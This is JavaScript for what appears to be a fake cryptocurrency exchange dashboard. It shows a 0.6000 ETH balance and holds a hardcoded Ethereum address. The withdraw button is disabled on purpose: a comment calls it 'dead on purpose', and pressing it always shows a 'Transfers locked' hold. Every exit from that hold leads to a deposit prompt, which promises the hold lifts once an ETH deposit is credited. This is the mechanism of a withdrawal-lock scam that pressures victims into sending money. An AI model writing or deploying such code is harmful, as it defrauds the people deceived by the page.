guard();

const ADDRESS = "0x2117e8B4E41a85e2C2b5f203D89bD3bFD28A29C3";

/* tabs */
document.querySelectorAll(".side a[data-tab]").forEach(a=>{
  a.addEventListener("click", e=>{
    e.preventDefault();
    document.querySelectorAll(".side a").forEach(x=>x.classList.remove("on"));
    a.classList.add("on");
    document.getElementById("tab-spot").style.display = a.dataset.tab === "spot" ? "" : "none";
    document.getElementById("tab-api").style.display  = a.dataset.tab === "api"  ? "" : "none";
  });
});

/* copy buttons */
document.addEventListener("click", e=>{
  const b = e.target.closest("[data-copy]");
  if(!b) return;
  navigator.clipboard.writeText(b.dataset.copy);
  const old = b.textContent;
  b.textContent = "Copied ✓";
  setTimeout(()=> b.textContent = old, 1500);
});

/* ---------- elements ---------- */
const ov        = document.getElementById("ov");
const ovd       = document.getElementById("ovd");
const ovw       = document.getElementById("ovw");
const stepForm  = document.getElementById("step-form");
const stepLoad  = document.getElementById("step-load");
const stepErr   = document.getElementById("step-err");
const mAddr     = document.getElementById("m-addr");
const mAmt      = document.getElementById("m-amt");
const badge     = document.getElementById("vbadge");

let source = "spot";

/* ---------- withdraw modal ---------- */
function openTransfer(src){
  source = src;
  document.getElementById("m-sub").textContent =
    src === "api" ? "Transfer API-linked balance to an external address" : "Send to an external address";
  document.getElementById("max-val").textContent = src === "api" ? "0.00 USDT" : "0.6000 ETH";
  mAmt.value = "";
  mAddr.value = "";
  mAddr.style.borderColor = "";
  mAmt.style.borderColor = "";
  stepForm.style.display = "";
  stepLoad.classList.remove("show");
  stepErr.classList.remove("show");
  ov.classList.add("open");
  setTimeout(()=> mAddr.focus(), 60);
}

document.querySelectorAll("[data-open-transfer]").forEach(b=>{
  b.addEventListener("click", ()=> openTransfer(b.dataset.openTransfer));
});

document.getElementById("close").addEventListener("click", ()=> ov.classList.remove("open"));
ov.addEventListener("click", e=>{ if(e.target === ov) ov.classList.remove("open"); });

document.getElementById("max").addEventListener("click", ()=>{
  mAmt.value = source === "api" ? "0.00" : "0.6000";
});

function lockBadge(){
  badge.classList.add("red");
  badge.textContent = "Transfers locked";
}

/* confirm is dead on purpose: account is flagged -> straight to the hold */
document.getElementById("m-go").addEventListener("click", ()=>{
  lockBadge();
  stepForm.style.display = "none";
  stepErr.classList.add("show");
});

/* close error panel leaves the state visible on the page */
document.getElementById("err-close").addEventListener("click", ()=>{
  ov.classList.remove("open");
  lockBadge();
  document.getElementById("hold-note").style.display = "flex";
});

/* ---------- deposit modal ---------- */
function openDeposit(){
  ov.classList.remove("open");
  ovw.classList.remove("open");
  ovd.classList.add("open");
}

document.querySelectorAll("[data-open-deposit]").forEach(b=>{
  b.addEventListener("click", openDeposit);
});
document.getElementById("err-verify").addEventListener("click", openDeposit);
document.getElementById("verify-btn").addEventListener("click", openDeposit);
document.getElementById("w-again").addEventListener("click", openDeposit);

document.getElementById("d-close").addEventListener("click", ()=> ovd.classList.remove("open"));
ovd.addEventListener("click", e=>{ if(e.target === ovd) ovd.classList.remove("open"); });

document.getElementById("d-done").addEventListener("click", ()=>{
  ovd.classList.remove("open");
  ovw.classList.add("open");
  lockBadge();
  const note = document.getElementById("hold-note");
  note.style.display = "flex";
  document.getElementById("hold-note-txt").innerHTML =
    "<b>Deposit pending confirmation.</b> We are monitoring the address. The hold lifts automatically once the ETH deposit is credited (12 confirmations).";
});

/* ---------- pending modal ---------- */
document.getElementById("w-close").addEventListener("click", ()=> ovw.classList.remove("open"));
document.getElementById("w-got").addEventListener("click", ()=> ovw.classList.remove("open"));
ovw.addEventListener("click", e=>{ if(e.target === ovw) ovw.classList.remove("open"); });